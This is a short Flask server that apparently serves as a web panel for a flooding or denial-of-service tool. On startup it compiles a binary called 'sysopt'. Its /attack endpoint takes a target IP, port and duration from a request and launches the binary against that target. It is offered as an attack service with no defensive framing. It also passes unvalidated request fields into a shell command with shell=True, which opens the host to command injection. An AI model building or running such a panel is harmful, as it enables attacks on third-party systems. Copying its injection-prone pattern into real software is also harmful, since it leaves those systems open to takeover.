from flask import Flask, request, jsonify, send_from_directory
import subprocess
import os

app = Flask(__name__)

# Compile attack binary on startup
os.system("gcc sysopt.c -o sysopt -pthread -O3 2>/dev/null")
os.system("chmod +x sysopt")

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/attack', methods=['POST'])
def attack():
    data = request.json
    ip = data.get('ip')
    port = data.get('port')
    duration = data.get('time')
    
    cmd = f"./sysopt {ip} {port} {duration} 500"
    subprocess.Popen(cmd, shell=True)
    
    return jsonify({"status": "success", "message": "Attack started"})

@app.route('/status', methods=['GET'])
def status():
    return jsonify({"status": "online"})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)